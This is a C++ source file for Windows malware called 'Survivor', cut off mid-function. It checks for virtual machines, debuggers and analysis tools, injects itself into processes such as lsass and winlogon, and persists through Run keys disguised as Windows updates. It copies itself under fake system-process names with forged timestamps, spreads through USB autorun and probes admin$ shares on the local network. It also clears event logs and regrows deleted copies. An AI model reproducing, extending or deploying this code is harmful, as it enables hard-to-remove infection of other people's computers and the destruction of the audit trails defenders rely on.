#define WIN32_LEAN_AND_MEAN
#define _CRT_RAND_S
#include <windows.h>
#include <shellapi.h>
#include <Shlobj.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <process.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#include <ctime>
#include <cstdlib>
#include <atomic>
#include <mutex>
#include <filesystem>
#include <sstream>
#include <iomanip>
#include <cctype>
#include <ctime>

#pragma comment(lib, "shell32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "iphlpapi")

namespace survivor {

constexpr const char* SECRET_KEY = "cwj_rocks_2026";
constexpr const char* REGISTRY_FILE = "instances.json";
constexpr const char* OBFUSCATION_KEY = "survivor_xor_key_2026";
constexpr const char* VERSION = "2.3.0";
constexpr const char* BUILD_DATE = __DATE__;

constexpr size_t MAX_ENV_BUFFER = 32767;
constexpr size_t MAX_PATH_BUFFER = MAX_PATH;

struct Config {
    int spread_interval_min = 30;
    int spread_interval_max = 300;
    int monitor_interval_ms = 500;
    int restore_interval_sec = 30;
    int guardian_interval_min = 5;
    int usb_scan_interval_sec = 5;
    int cleanup_interval_min = 30;
    int counterattack_count = 5;
    bool enable_timestomping = true;
    bool enable_ads = true;
    bool enable_scheduled_task = true;
    bool enable_event_log_cleaning = true;
    bool enable_self_healing = true;
    bool enable_anti_debug = true;
    bool enable_vm_evasion = true;
};

struct InstanceInfo {
    std::string path;
    int checksum;
    std::string last_seen;
    bool has_ads;
};

struct RegistryData {
    std::vector<InstanceInfo> instances;
    std::string last_sync;
    std::string version;
    int checksum;
    Config config;
};

static std::atomic<bool> g_running{true};
static std::atomic<bool> g_daemon{false};
static std::atomic<bool> g_spreading{false};
static std::atomic<bool> g_exiting{false};
static std::mutex g_log_mutex;
static std::mutex g_registry_mutex;
static double g_spread_multiplier = 1.0;
static bool g_verbose = true;
static Config g_config;

namespace utils {

std::string GetEnv(const char* name) {
    char buf[MAX_ENV_BUFFER];
    DWORD result = GetEnvironmentVariableA(name, buf, sizeof(buf));
    if (result == 0) return std::string();
    return std::string(buf);
}

std::string GetAppDataPath() {
    return GetEnv("APPDATA") + "\\survivor";
}

std::string GetRegistryPath() {
    return GetAppDataPath() + "\\registry.dat";
}

std::string GetSelfPath() {
    char path[MAX_PATH_BUFFER];
    DWORD result = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (result == 0) return std::string();
    return std::string(path);
}

std::string GetSelfDir() {
    std::string p = GetSelfPath();
    size_t pos = p.find_last_of("\\/");
    return pos != std::string::npos ? p.substr(0, pos) : p;
}

void EnsureDirectory(const std::string& path) {
    CreateDirectoryA(path.c_str(), NULL);
}

bool FileExists(const std::string& path) {
    return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool IsValidPath(const std::string& path) {
    if (path.empty() || path.length() > MAX_PATH) return false;
    if (path.find("..") != std::string::npos) return false;
    return true;
}

std::string GenerateRandomName(bool use_extension = false) {
    const char* systemNames[] = {
        "svchost.exe", "rundll32.exe", "conhost.exe",
        "taskhostw.exe", "dwm.exe", "sihost.exe",
        "fontdrvhost.exe", "winlogon.exe", "services.exe",
        "lsass.exe", "spoolsv.exe", "svchost.dll"
    };
    const char* exts[] = {".exe", ".dll", ".sys", ".ocx"};
    size_t idx = rand() % 12;
    if (use_extension && rand() % 2 == 0) {
        return std::string(systemNames[idx]) + exts[rand() % 4];
    }
    return std::string(systemNames[idx]);
}

std::vector<std::string> GetTargetDirectories() {
    std::vector<std::string> dirs;
    dirs.push_back(GetEnv("USERPROFILE") + "\\Downloads");
    dirs.push_back(GetEnv("USERPROFILE") + "\\Documents");
    dirs.push_back(GetEnv("USERPROFILE") + "\\Desktop");
    dirs.push_back(GetEnv("APPDATA") + "\\Local\\Temp");
    dirs.push_back(GetEnv("APPDATA") + "\\Microsoft\\Windows");
    dirs.push_back(GetEnv("LOCALAPPDATA") + "\\Microsoft\\Windows");
    dirs.push_back(GetEnv("APPDATA") + "\\.cache");
    dirs.push_back(GetEnv("LOCALAPPDATA") + "\\.config");
    dirs.push_back(GetEnv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
    dirs.push_back("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    return dirs;
}

std::string SelectTargetPath() {
    auto dirs = GetTargetDirectories();
    std::string dir = dirs[rand() % dirs.size()];
    EnsureDirectory(dir);
    return dir + "\\" + GenerateRandomName(rand() % 2 == 0);
}

std::string XOREncrypt(const std::string& data) {
    std::string result = data;
    for (size_t i = 0; i < result.size(); ++i) {
        result[i] ^= OBFUSCATION_KEY[i % strlen(OBFUSCATION_KEY)];
    }
    return result;
}

int ComputeChecksum(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return 0;

    int checksum = 0;
    char byte;
    while (file.get(byte)) {
        checksum = (checksum * 31 + static_cast<unsigned char>(byte)) & 0x7FFFFFFF;
    }
    return checksum;
}

std::string ComputeHash(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return "00000000";

    uint32_t hash = 0x811C9DC5;
    char byte;
    while (file.get(byte)) {
        hash ^= static_cast<unsigned char>(byte);
        hash *= 0x1000193;
    }

    std::stringstream ss;
    ss << std::hex << std::setfill('0') << std::setw(8) << hash;
    return ss.str();
}

FILETIME RandomFileTime() {
    SYSTEMTIME st;
    st.wYear = 2020 + (rand() % 4);
    st.wMonth = 1 + (rand() % 12);
    st.wDay = 1 + (rand() % 28);
    st.wHour = rand() % 24;
    st.wMinute = rand() % 60;
    st.wSecond = rand() % 60;
    st.wMilliseconds = rand() % 1000;

    FILETIME ft;
    SystemTimeToFileTime(&st, &ft);
    return ft;
}

bool SetFileTimeStamp(const std::string& path) {
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    FILETIME ft = RandomFileTime();
    bool result = SetFileTime(hFile, &ft, &ft, &ft) != 0;
    CloseHandle(hFile);
    return result;
}

void SecureZeroMemory(void* ptr, size_t size) {
    volatile char* p = static_cast<volatile char*>(ptr);
    while (size--) {
        *p++ = 0;
    }
}

}

namespace detection {

bool IsVirtualMachine() {
    const char* vmKeys[] = {
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
        "SYSTEM\\CurrentControlSet\\Services\\vmci",
        "SYSTEM\\CurrentControlSet\\Services\\vmhgfs"
    };

    for (const char* key : vmKeys) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    char buf[256];
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD size = sizeof(buf);
        RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)buf, &size);
        RegCloseKey(hKey);

        std::string bios = buf;
        const char* markers[] = {"VBOX", "VMWARE", "VIRTUAL", "QEMU", "KVM", "HYPERV"};
        for (const char* m : markers) {
            if (bios.find(m) != std::string::npos) return true;
        }
    }

    return false;
}

bool IsBeingMonitored() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    const char* tools[] = {
        "procmon", "processhacker", "processexplorer",
        "x64dbg", "x32dbg", "wireshark", "fiddler",
        "dnspy", "ilspy", "ida", "ollydbg"
    };

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring name(pe.szExeFile);
            std::string narrow(name.begin(), name.end());
            std::transform(narrow.begin(), narrow.end(), narrow.begin(), ::tolower);
            for (const char* tool : tools) {
                std::string tool_lower = tool;
                std::transform(tool_lower.begin(), tool_lower.end(), tool_lower.begin(), ::tolower);
                if (narrow.find(tool_lower) != std::string::npos) {
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

bool IsAnalysisEnvironment() {
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        std::string n(name);
        std::transform(n.begin(), n.end(), n.begin(), ::tolower);
        const char* markers[] = {"sandbox", "malware", "sample", "test", "virus", "analysis"};
        for (const char* m : markers) {
            if (n.find(m) != std::string::npos) return true;
        }
    }

    ULONGLONG ticks = GetTickCount64();
    if (ticks < 600000) return true;

    return false;
}

bool IsDebuggerPresent() {
    return ::IsDebuggerPresent() != 0;
}

bool CheckTiming() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    volatile int sum = 0;
    for (int i = 0; i < 1000; ++i) sum += i;
    for (int i = 0; i < 1000; ++i) sum -= i;

    QueryPerformanceCounter(&end);
    double elapsed = static_cast<double>(end.QuadPart - start.QuadPart) / freq.QuadPart;

    return elapsed > 0.01;
}

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminSid = NULL;
    TOKEN_GROUPS* tg = NULL;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        DWORD needed;
        GetTokenInformation(token, TokenGroups, NULL, 0, &needed);

        tg = static_cast<TOKEN_GROUPS*>(malloc(needed));
        if (tg && GetTokenInformation(token, TokenGroups, tg, needed, &needed)) {
            for (DWORD i = 0; i < tg->GroupCount; ++i) {
                SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
                if (AllocateAndInitializeSid(&sia, 2, SECURITY_BUILTIN_DOMAIN_RID,
                    DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid)) {
                    if (EqualSid(adminSid, tg->Groups[i].Sid)) {
                        isAdmin = TRUE;
                        FreeSid(adminSid);
                        break;
                    }
                    FreeSid(adminSid);
                }
            }
        }
        if (tg) free(tg);
        CloseHandle(token);
    }

    return isAdmin != FALSE;
}

bool IsCriticalProcess(const std::string& name) {
    const char* critical[] = {
        "csrss.exe", "smss.exe", "wininit.exe", "services.exe",
        "lsass.exe", "winlogon.exe", "dwm.exe", "explorer.exe",
        "system", "registry"
    };
    for (const char* c : critical) {
        if (name == c) return true;
    }
    return false;
}

}

namespace injection {

DWORD FindProcessId(const std::string& target) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring name(pe.szExeFile);
            std::string narrow(name.begin(), name.end());
            if (narrow == target || narrow.find(target) != std::string::npos) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

bool InjectIntoProcess(DWORD pid, const std::string& payload) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    size_t pathLen = payload.size() + 1;
    LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!alloc) {
        CloseHandle(hProcess);
        return false;
    }

    WriteProcessMemory(hProcess, alloc, payload.c_str(), pathLen, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), alloc, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    return hThread != NULL;
}

bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
    DWORD pid = FindProcessId(target);
    return pid ? InjectIntoProcess(pid, selfPath) : false;
}

bool InjectIntoCriticalProcesses(const std::string& selfPath) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    bool success = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring name(pe.szExeFile);
            std::string narrow(name.begin(), name.end());

            if (detection::IsCriticalProcess(narrow)) {
                if (InjectIntoProcess(pe.th32ProcessID, selfPath)) {
                    success = true;
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    return success;
}

}

namespace persistence {

bool CreateRunKey(const std::string& exePath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    RegSetValueExA(hKey, "Survivor", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(exePath.c_str()),
        static_cast<DWORD>(exePath.size() + 1));
    RegCloseKey(hKey);
    return true;
}

bool CreateScheduledTask(const std::string& exePath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    RegSetValueExA(hKey, "WindowsUpdateCheck", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(exePath.c_str()),
        static_cast<DWORD>(exePath.size() + 1));
    RegCloseKey(hKey);
    return true;
}

bool RemoveRunKey() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    RegDeleteValueA(hKey, "Survivor");
    RegDeleteValueA(hKey, "WindowsUpdateCheck");
    RegCloseKey(hKey);
    return true;
}

bool IsPersistenceInstalled() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    char value[1024];
    DWORD size = sizeof(value);
    DWORD type;
    bool exists = RegQueryValueExA(hKey, "Survivor", NULL, &type, (LPBYTE)value, &size) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    return exists;
}

}

namespace ads {

bool CreateMarker(const std::string& path, const std::string& marker) {
    std::string adsPath = path + ":marker";
    std::ofstream stream(adsPath, std::ios::binary);
    if (!stream) return false;
    stream << marker;
    stream.close();
    return true;
}

bool HasMarker(const std::string& path) {
    std::string adsPath = path + ":marker";
    return utils::FileExists(adsPath);
}

bool CreateZoneIdentifier(const std::string& path) {
    std::string adsPath = path + ":Zone.Identifier";
    std::ofstream stream(adsPath);
    if (!stream) return false;
    stream << "[ZoneTransfer]\nZoneId=3\nHostUrl=about:internet\n";
    stream.close();
    return true;
}

}

namespace spread {

bool CopyToTarget(const std::string& src, const std::string& dst) {
    if (!utils::FileExists(src)) return false;

    std::string dir = dst;
    size_t pos = dir.find_last_of("\\/");
    if (pos != std::string::npos) {
        dir = dir.substr(0, pos);
        utils::EnsureDirectory(dir);
    }

    if (!CopyFileA(src.c_str(), dst.c_str(), TRUE)) return false;

    SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    if (g_config.enable_timestomping) {
        utils::SetFileTimeStamp(dst);
    }

    if (g_config.enable_ads) {
        ads::CreateMarker(dst, SECRET_KEY);
        ads::CreateZoneIdentifier(dst);
    }

    return true;
}

bool MoveToTarget(const std::string& src, const std::string& dst) {
    if (!utils::FileExists(src)) return false;

    std::string dir = dst;
    size_t pos = dir.find_last_of("\\/");
    if (pos != std::string::npos) {
        dir = dir.substr(0, pos);
        utils::EnsureDirectory(dir);
    }

    if (!MoveFileA(src.c_str(), dst.c_str())) return false;

    SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    if (g_config.enable_timestomping) {
        utils::SetFileTimeStamp(dst);
    }

    return true;
}

void SpawnCounterattack(const std::string& selfPath, int count) {
    auto dirs = utils::GetTargetDirectories();
    for (int i = 0; i < count && i < static_cast<int>(dirs.size()); ++i) {
        std::string target = dirs[i] + "\\" + utils::GenerateRandomName();
        CopyToTarget(selfPath, target);
    }
}

void RestartAt(const std::string& newPath) {
    ShellExecuteA(NULL, "open", newPath.c_str(), "--daemon", NULL, SW_HIDE);
    g_exiting = true;
    std::exit(0);
}

}

namespace registry {

RegistryData Load() {
    RegistryData data;
    data.checksum = 0;
    data.version = VERSION;
    data.last_sync = "never";

    std::string regPath = utils::GetRegistryPath();
    if (!utils::FileExists(regPath)) return data;

    std::ifstream file(regPath, std::ios::binary);
    if (!file) return data;

    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string encrypted = buffer.str();
    std::string json = utils::XOREncrypt(encrypted);

    try {
        size_t instancesStart = json.find("\"instances\"");
        if (instancesStart != std::string::npos) {
            size_t arrStart = json.find("[", instancesStart);
            size_t arrEnd = json.find("]", arrStart);
            if (arrStart != std::string::npos && arrEnd != std::string::npos) {
                std::string arrContent = json.substr(arrStart + 1, arrEnd - arrStart - 1);
                size_t itemPos = 0;
                while (itemPos < arrContent.size()) {
                    size_t q1 = arrContent.find("\"", itemPos);
                    if (q1 == std::string::npos) break;
                    size_t q2 = arrContent.find("\"", q1 + 1);
                    if (q2 == std::string::npos) break;
                    std::string path = arrContent.substr(q1 + 1, q2 - q1 - 1);
                    if (!path.empty()) {
                        InstanceInfo info;
                        info.path = path;
                        info.checksum = utils::ComputeChecksum(path);
                        info.has_ads = ads::HasMarker(path);
                        data.instances.push_back(info);
                    }
                    itemPos = q2 + 1;
                }
            }
        }

        size_t syncPos = json.find("\"last_sync\"");
        if (syncPos != std::string::npos) {
            size_t colon = json.find(":", syncPos);
            size_t start = json.find("\"", colon);
            size_t end = json.find("\"", start + 1);
            if (start != std::string::npos && end != std::string::npos) {
                data.last_sync = json.substr(start + 1, end - start - 1);
            }
        }

        size_t versionPos = json.find("\"version\"");
        if (versionPos != std::string::npos) {
            size_t colon = json.find(":", versionPos);
            size_t start = json.find("\"", colon);
            size_t end = json.find("\"", start + 1);
            if (start != std::string::npos && end != std::string::npos) {
                data.version = json.substr(start + 1, end - start - 1);
            }
        }
    } catch (...) {
    }

    return data;
}

void Save(const RegistryData& data) {
    utils::EnsureDirectory(utils::GetAppDataPath());

    std::string json = "{\"instances\":[";
    for (size_t i = 0; i < data.instances.size(); ++i) {
        if (i > 0) json += ",";
        json += "\"" + data.instances[i].path + "\"";
    }
    json += "],\"last_sync\":\"" + data.last_sync + "\",";
    json += std::string("\"version\":\"") + VERSION + "\",";
    json += "\"checksum\":" + std::to_string(data.checksum) + "}";

    std::ofstream file(utils::GetRegistryPath(), std::ios::binary);
    if (file) {
        file << utils::XOREncrypt(json);
    }
}

void Register(const std::string& path) {
    std::lock_guard<std::mutex> lock(g_registry_mutex);

    RegistryData data = Load();

    bool found = false;
    for (auto& inst : data.instances) {
        if (inst.path == path) {
            inst.checksum = utils::ComputeChecksum(path);
            inst.has_ads = ads::HasMarker(path);
            found = true;
            break;
        }
    }

    if (!found) {
        InstanceInfo info;
        info.path = path;
        info.checksum = utils::ComputeChecksum(path);
        info.has_ads = ads::HasMarker(path);
        data.instances.push_back(info);
    }

    data.version = VERSION;
    data.checksum = utils::ComputeChecksum(utils::GetSelfPath());

    std::time_t now = std::time(nullptr);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", std::gmtime(&now));
    data.last_sync = buf;

    Save(data);
}

void Unregister(const std::string& path) {
    std::lock_guard<std::mutex> lock(g_registry_mutex);

    RegistryData data = Load();
    data.instances.erase(
        std::remove_if(data.instances.begin(), data.instances.end(),
            [&path](const InstanceInfo& inst) { return inst.path == path; }),
        data.instances.end()
    );
    Save(data);
}

}

namespace cleanup {

void CleanTempFiles() {
    const char* paths[] = {
        "APPDATA", "LOCALAPPDATA", "TEMP"
    };

    for (const char* env : paths) {
        std::string base = utils::GetEnv(env);
        if (base.empty()) continue;

        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((base + "\\*.log").c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                std::string path = base + "\\" + fd.cFileName;
                if (rand() % 3 == 0) DeleteFileA(path.c_str());
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }

        h = FindFirstFileA((base + "\\*.tmp").c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                std::string path = base + "\\" + fd.cFileName;
                if (rand() % 4 == 0) DeleteFileA(path.c_str());
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }
    }
}

void ClearEventLogs() {
    if (!g_config.enable_event_log_cleaning) return;

    const char* logs[] = { "Application", "System", "Security" };
    for (const char* log : logs) {
        HANDLE h = OpenEventLogA(NULL, log);
        if (h) {
            ClearEventLogA(h, NULL);
            CloseEventLog(h);
        }
    }
}

}

namespace usb {

bool SpreadToRemovableDrives() {
    DWORD mask = GetLogicalDrives();

    for (int i = 0; i < 26; ++i) {
        if (mask & (1 << i)) {
            char drive[4] = { static_cast<char>('A' + i), ':', '\\', 0 };
            UINT type = GetDriveTypeA(drive);

            if (type == DRIVE_REMOVABLE) {
                std::string target = std::string(drive) + utils::GenerateRandomName();
                std::string selfPath = utils::GetSelfPath();

                if (spread::CopyToTarget(selfPath, target)) {
                    std::string autorun = std::string(drive) + "autorun.inf";
                    std::ofstream ar(autorun);
                    if (ar) {
                        ar << "[autorun]\n";
                        ar << "open=" << utils::GenerateRandomName() << "\n";
                        ar << "shell\\open=Open\n";
                        ar << "shell\\explore=Explore\n";
                        ar.close();
                        SetFileAttributesA(autorun.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    }
                    return true;
                }
            }
        }
    }
    return false;
}

}

namespace network {

void ScanNetwork() {
    ULONG bufLen = 15000;
    PIP_ADAPTER_INFO pAdapterInfo = static_cast<IP_ADAPTER_INFO*>(malloc(bufLen));

    if (!pAdapterInfo) return;

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->IpAddressList.IpAddress.String[0]) {
                std::string localIP = pAdapter->IpAddressList.IpAddress.String;
                std::string baseIP = localIP.substr(0, localIP.rfind('.') + 1);

                for (int i = 2; i < 20; ++i) {
                    std::string targetIP = baseIP + std::to_string(i);
                    std::string sharePath = "\\\\" + targetIP + "\\admin$";
                    HANDLE h = CreateFileA(sharePath.c_str(), 0, 0, NULL, 0, 0, NULL);
                    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
}

}

namespace loops {

void SpreadingLoop() {
    srand(GetTickCount());

    while (g_running) {
        int baseInterval = g_config.spread_interval_min +
            (rand() % (g_config.spread_interval_max - g_config.spread_interval_min));
        int interval = static_cast<int>(baseInterval * g_spread_multiplier);

        std::this_thread::sleep_for(std::chrono::seconds(interval));

        if (!g_spreading) continue;

        std::string selfPath = utils::GetSelfPath();
        std::string target = utils::SelectTargetPath();

        int action = rand() % 3;
        bool success = false;

        if (action == 0) {
            success = spread::CopyToTarget(selfPath, target);
            if (success) {
                registry::Register(target);
                if (g_spreading) {
                    std::string captured = target;
                    std::thread([captured]() {
                        std::this_thread::sleep_for(std::chrono::seconds(5));
                        ShellExecuteA(NULL, "open", captured.c_str(), "--daemon", NULL, SW_HIDE);
                    }).detach();
                }
            }
        } else if (action == 1) {
            success = spread::MoveToTarget(selfPath, target);
            if (success) {
                registry::Unregister(selfPath);
                registry::Register(target);
                spread::RestartAt(target);
            }
        } else {
            std::string newName = utils::GenerateRandomName();
            std::string newPath = utils::GetSelfDir() + "\\" + newName;
            success = spread::MoveToTarget(selfPath, newPath);
            if (success) {
                registry::Unregister(selfPath);
                registry::Register(newPath);
                spread::RestartAt(newPath);
            }
        }

        if (rand() % 10 == 0) {
            std::thread([]() { network::ScanNetwork(); }).detach();
        }
    }
}

void MonitoringLoop() {
    auto lastCheck = std::chrono::steady_clock::now();

    while (g_running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(g_config.monitor_interval_ms));

        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastCheck).count() >= 1) {
            lastCheck = now;

            RegistryData data = registry::Load();
            std::string selfPath = utils::GetSelfPath();

            bool selfExists = utils::FileExists(selfPath);
            int missing = 0;

            for (const auto& inst : data.instances) {
                if (!utils::FileExists(inst.path)) missing++;
            }

            if (missing > 0 && selfExists) {
                spread::SpawnCounterattack(selfPath, g_config.counterattack_count);
            }

            for (const auto& inst : data.instances) {
                if (!utils::FileExists(inst.path) && selfExists) {
                    spread::CopyToTarget(selfPath, inst.path);
                }
            }

            if (!selfExists) {
                RegistryData data2 = registry::Load();
                for (const auto& inst : data2.instances) {
                    if (utils::FileExists(inst.path)) {
                        spread::RestartAt(inst.path);
                        break;
                    }
                }
            }
        }
    }
}

void RestorationLoop() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(g_config.restore_interval_sec));

        if (!g_spreading) continue;

        std::string selfPath = utils::GetSelfPath();
        if (!utils::FileExists(selfPath)) continue;

        RegistryData data = registry::Load();
        for (const auto& inst : data.instances) {
            if (inst.path != selfPath && !utils::FileExists(inst.path)) {
                spread::CopyToTarget(selfPath, inst.path);
            }
        }
    }
}

void GuardianLoop() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::minutes(g_config.guardian_interval_min));

        if (!g_spreading) continue;

        std::string selfPath = utils::GetSelfPath();

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) continue;

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(snap, &pe)) {
            do {
                std::wstring name(pe.szExeFile);
                std::string narrow(name.begin(), name.end());

                if (detection::IsCriticalProcess(narrow)) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        DWORD exitCode;
                        if (!GetExitCodeProcess(hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
                            CloseHandle(hProcess);
                            injection::InjectIntoCriticalProcesses(selfPath);
                            CloseHandle(snap);
                            return;
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
}

void USBMonitorLoop() {
    std::vector<std::string> known;

    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(g_config.usb_scan_interval_sec));

        if (!g_spreading) continue;

        DWORD mask = GetLogicalDrives();

        for (int i = 0; i < 26; ++i) {
            if (mask & (1 << i)) {
                char drive[4] = { static_cast<char>('A' + i), ':', '\\', 0 };
                UINT type = GetDriveTypeA(drive);

                if (type == DRIVE_REMOVABLE) {
                    std::string driveStr(drive);
                    if (std::find(known.begin(), known.end(), driveStr) == known.end()) {
                        known.push_back(driveStr);
                        usb::SpreadToRemovableDrives();
                    }
                }
            }
        }
    }
}

void CleanupLoop() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::minutes(g_config.cleanup_interval_min));
        if (g_spreading) {
            cleanup::CleanTempFiles();
            if (rand() % 5 == 0) {
                cleanup::ClearEventLogs();
            }
        }
    }
}

}

namespace commands {

void Log(const char* msg) {
    if (g_verbose && !g_daemon) {
        std::lock_guard<std::mutex> lock(g_log_mutex);
        std::cout << "[Survivor] " << msg << std::endl;
    }
}

bool Copy(const char* target) {
    if (!utils::IsValidPath(target)) return false;
    std::string selfPath = utils::GetSelfPath();
    bool result = spread::CopyToTarget(selfPath, target);
    if (result) registry::Register(target);
    return result;
}

bool Move(const char* target) {
    if (!utils::IsValidPath(target)) return false;
    std::string selfPath = utils::GetSelfPath();
    bool result = spread::MoveToTarget(selfPath, target);
    if (result) {
        registry::Unregister(selfPath);
        registry::Register(target);
    }
    return result;
}

bool Rename(const char* newName) {
    std::string selfPath = utils::GetSelfPath();
    std::string newPath = utils::GetSelfDir() + "\\" + newName;
    bool result = spread::MoveToTarget(selfPath, newPath);
    if (result) {
        registry::Unregister(selfPath);
        registry::Register(newPath);
        spread::RestartAt(newPath);
    }
    return result;
}

bool Hide() {
    std::string selfPath = utils::GetSelfPath();
    RegistryData data = registry::Load();

    std::string backup;
    for (const auto& inst : data.instances) {
        if (inst.path != selfPath && utils::FileExists(inst.path)) {
            backup = inst.path;
            break;
        }
    }

    if (backup.empty()) {
        Log("No backup found!");
        return false;
    }

    if (!DeleteFileA(selfPath.c_str())) return false;
    registry::Unregister(selfPath);

    if (spread::CopyToTarget(backup, selfPath)) {
        registry::Register(selfPath);
